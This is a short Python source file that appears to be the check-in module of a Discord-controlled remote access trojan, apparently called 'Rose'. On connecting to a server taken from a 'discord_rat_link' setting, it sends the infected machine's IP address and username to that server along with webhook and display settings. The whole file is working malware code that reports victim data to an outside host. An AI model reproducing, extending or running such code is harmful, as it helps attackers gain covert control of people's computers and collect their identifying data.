import socketio
from dhooks import Webhook as web
from dhooks import Embed

from configuration import Config 
cc = Config()

from informations import Info
ii = Info()

sio = socketio.Client()


@sio.event
def connect():
    sio.emit('rose_connect', {'data': {
        'ip': ii.get_ip(),
        'username': ii.get_username(),
        'server': cc.get_discord_rat_link(),
        'webhook': cc.get_webhook(),
        'avatar': cc.get_avatar(),
        'footer': cc.get_footer(),
    }})



@sio.event
def disconnect():
    print("disconnect")
    
sio.connect(cc.get_discord_rat_link())
sio.wait()
